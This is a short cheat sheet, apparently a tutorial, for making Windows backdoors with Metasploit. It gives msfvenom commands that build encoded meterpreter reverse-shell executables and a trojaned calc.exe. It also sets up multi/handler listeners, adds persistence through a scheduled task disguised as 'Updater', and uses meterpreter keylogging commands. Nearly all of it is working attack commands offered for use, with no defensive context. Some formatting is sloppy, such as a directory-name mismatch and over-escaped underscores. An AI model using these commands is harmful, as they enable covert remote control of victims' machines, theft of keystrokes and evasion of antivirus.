To begin, you need first to create a directory called backdoors. You can use the following command.

> mkdir backdoor



##### Creating an Executable Binary (Unencoded Payload)



Our example will be using

“windows/meterpreter/reverse\_https”



payload

msfpayload {payload\_name} S



msfvenom -p windows/meterpreter/reverse\_tcp LHOST={YOUR\_IP} LPORT={PORT} -f exe -o /root/backdoors/unencoded-payload.exe



##### Creating an Executable Binary (Encoded Payload)



msfvenom -p windows/meterpreter/reverse\_tcp LHOST={Your\_IP} LPORT={ANY\_PORT} -e x86/countdown -i 2 -e x86/shikata\_ga\_nai -i 3 -f exe -o /root/backdoors/encoded-payload.exe





###### Setting up a Metasploit Listener



> Msfconsole 

> use exploit/multi/handler 

> set payload windows/meterpreter/reverse\\\_tcp 

> set lhost {your\\\\\\\_ip} 

> set lport {port} 

> exploit





##### Encoded Trojan Horse - For Windows 7 x64



msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST={YOUR\_IP} LPORT={PORT} -e x86/shikata\_ga\_nai -i 3 -x /calc.exe -k -f exe -o /root/backdoors/Trojan-calc64.exe



###### Setting up a Metasploit Listener



> Msfconsole 

> use exploit/multi/handler 

> set PAYLOAD windows/x64/meterpreter/reverse\\\_tcp

> set lhost {your\\\_ip} 

> set lport {port} 

> exploit



##### Persistent Backdoors



The command is as follows:

schtasks /create /sc minute /mo 5 /tn "Updater" /tr "C:\\path\\to\\backdoor.exe"



##### Keyloggers 



Keyscan\_start 

Keyscan\_dump 

Keyscan\_dump (repeat as necessary) 

Keyscan\_stop 



